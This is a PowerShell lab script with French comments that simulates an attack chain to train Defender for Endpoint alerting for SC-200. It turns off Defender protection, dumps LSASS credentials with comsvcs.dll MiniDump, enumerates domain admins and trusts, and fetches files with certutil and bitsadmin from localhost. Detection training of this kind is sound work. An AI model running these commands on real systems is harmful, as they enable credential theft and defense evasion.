#Requires -Version 5.1
#Requires -RunAsAdministrator
<#
.SYNOPSIS
    [LAB SC-200] Scenario B - Acces aux identifiants et mouvement lateral
    Evasion -> Credential Access (LSASS) -> Decouverte AD -> Prep. mouvement lateral
    Genere une chaine d'alertes correlees en UN SEUL incident (distinct du Scenario A).

.DESCRIPTION
    Script de SIMULATION a usage EXCLUSIF de formation, sur une VM de lab isolee
    onboardee dans Microsoft Defender for Endpoint.

    Points d'attention :
      - L'etape LSASS utilise le LOLBin comsvcs.dll (MiniDump). Elle PRODUIT un vrai
        dump memoire de LSASS qui peut contenir des secrets ; le script le SUPPRIME
        immediatement. A n'executer QUE sur une VM de lab jetable.
      - Si la regle ASR "Block credential stealing from LSASS" ou la Tamper Protection
        sont actives, l'action est BLOQUEE et generera quand meme une alerte (resultat OK).
      - La protection temps reel est desactivee/reactivee de maniere reversible (-Cleanup
        et bloc finally). Le but est de declencher une alerte de "tampering".

    NE JAMAIS executer sur un poste de production ou un environnement non autorise.

.PARAMETER Force
    Lance le scenario sans confirmation interactive.

.PARAMETER Cleanup
    Restaure la protection, retire l'exclusion, supprime les artefacts, puis quitte.

.NOTES
    MITRE ATT&CK : T1562.001 / T1003.001 / T1087.002 / T1482 / T1018 /
                   T1105 / T1047 / T1033
#>
[CmdletBinding()]
param(
    [switch]$Force,
    [switch]$Cleanup
)

$ScenarioName = "Scenario B - Acces aux identifiants"
$WorkDir      = "C:\LabSC200\ScenarioB"
$LogFile      = Join-Path $env:TEMP "LabSC200-ScenarioB.log"

function Write-Stage {
    param([string]$Step, [string]$Message)
    $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
    $line = "[$ts] [$Step] $Message"
    Write-Host $line -ForegroundColor Cyan
    Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue
}

function Restore-Protection {
    # Reactive la protection temps reel et retire l'exclusion - idempotent
    try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
    try { Remove-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue } catch {}
}

function Invoke-Cleanup {
    Write-Host "`n--- Nettoyage des artefacts du Scenario B ---" -ForegroundColor Yellow
    Restore-Protection
    Remove-Item -Path $WorkDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Host "Nettoyage termine (protection restauree, exclusion retiree, dossier supprime)." -ForegroundColor Green
}

if ($Cleanup) { Invoke-Cleanup; return }

Write-Host "==========================================================" -ForegroundColor Red
Write-Host " LAB SC-200 - $ScenarioName" -ForegroundColor Red
Write-Host " SIMULATION D'ATTAQUE - VM DE FORMATION JETABLE UNIQUEMENT" -ForegroundColor Red
Write-Host " (Cette execution touche a LSASS - lab isole obligatoire)" -ForegroundColor Red
Write-Host "==========================================================" -ForegroundColor Red
if (-not $Force) {
    $ans = Read-Host "Confirmez l'execution sur une VM de lab autorisee en tapant OUI"
    if ($ans -ne "OUI") { Write-Host "Annule." -ForegroundColor Yellow; return }
}

New-Item -ItemType Directory -Path $WorkDir -Force | Out-Null
Write-Stage "INIT" "Demarrage du scenario. Journal : $LogFile"

try {
    # ----------------------------------------------------------------------
    # Etape 1 - EVASION : exclusion AV + tentative de desactivation temps reel
    # (bloquees si Tamper Protection active = alerte de tampering attendue)
    # ----------------------------------------------------------------------
    Write-Stage "T1562.001" "Ajout d'une exclusion Defender et tentative de desactivation (Defense Evasion)"
    try { Add-MpPreference -ExclusionPath $WorkDir -ErrorAction SilentlyContinue } catch {}
    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}

    # ----------------------------------------------------------------------
    # Etape 2 - CREDENTIAL ACCESS : dump LSASS via comsvcs.dll (LOLBin)
    # Genere "Suspicious access to LSASS" / vol d'identifiants (severite elevee).
    # Le dump est supprime immediatement.
    # ----------------------------------------------------------------------
    Write-Stage "T1003.001" "Tentative de dump LSASS via comsvcs.dll MiniDump (Credential Access)"
    try {
        $lsassPid = (Get-Process -Name lsass -ErrorAction Stop).Id
        $dump = Join-Path $WorkDir "lsass.dmp"
        Start-Process -FilePath "rundll32.exe" `
            -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $lsassPid `"$dump`" full" `
            -Wait -ErrorAction SilentlyContinue
    } catch {
        Write-Stage "T1003.001" "Action bloquee (ASR/Tamper) = alerte attendue."
    } finally {
        if ($dump -and (Test-Path $dump)) { Remove-Item $dump -Force -ErrorAction SilentlyContinue }
    }

    # ----------------------------------------------------------------------
    # Etape 3 - DECOUVERTE : reconnaissance Active Directory / comptes privilegies
    # ----------------------------------------------------------------------
    Write-Stage "T1087.002/T1482/T1018" "Reconnaissance AD et comptes a privileges"
    cmd.exe /c "whoami /priv"                              2>$null | Out-Null
    cmd.exe /c "net group ""Domain Admins"" /domain"       2>$null | Out-Null
    cmd.exe /c "net group ""Enterprise Admins"" /domain"   2>$null | Out-Null
    cmd.exe /c "net accounts /domain"                      2>$null | Out-Null
    cmd.exe /c "nltest /dclist:%userdnsdomain%"            2>$null | Out-Null
    cmd.exe /c "nltest /domain_trusts"                     2>$null | Out-Null
    cmd.exe /c "query user"                                2>$null | Out-Null

    # ----------------------------------------------------------------------
    # Etape 4 - PREP. MOUVEMENT LATERAL : LOLBins (certutil / bitsadmin) + WMI
    # Cibles 127.0.0.1 => echec reseau, mais les patterns sont les IOC detectes.
    # ----------------------------------------------------------------------
    Write-Stage "T1105" "Telechargement LOLBin via certutil et bitsadmin (Ingress Tool Transfer)"
    cmd.exe /c "certutil.exe -urlcache -split -f http://127.0.0.1/tool.txt $WorkDir\tool.txt" 2>$null | Out-Null
    cmd.exe /c "bitsadmin /transfer lab /download /priority normal http://127.0.0.1/x.txt $WorkDir\x.txt" 2>$null | Out-Null

    Write-Stage "T1047/T1033" "Creation de processus via WMI (pattern de mouvement lateral)"
    cmd.exe /c "wmic /node:localhost process call create ""cmd.exe /c whoami""" 2>$null | Out-Null
}
finally {
    # Securite : toujours restaurer la protection temps reel a la fin
    Restore-Protection
}

Write-Host "`n==========================================================" -ForegroundColor Green
Write-Host " Scenario B termine. Protection temps reel restauree." -ForegroundColor Green
Write-Host " Les alertes apparaissent dans Defender XDR sous ~10-30 min," -ForegroundColor Green
Write-Host " correlees en UN incident distinct du Scenario A." -ForegroundColor Green
Write-Host " Pour nettoyer : .\Invoke-LabScenarioB-VolIdentifiants.ps1 -Cleanup" -ForegroundColor Green
Write-Host "==========================================================" -ForegroundColor Green
Write-Stage "DONE" "Scenario B complete."
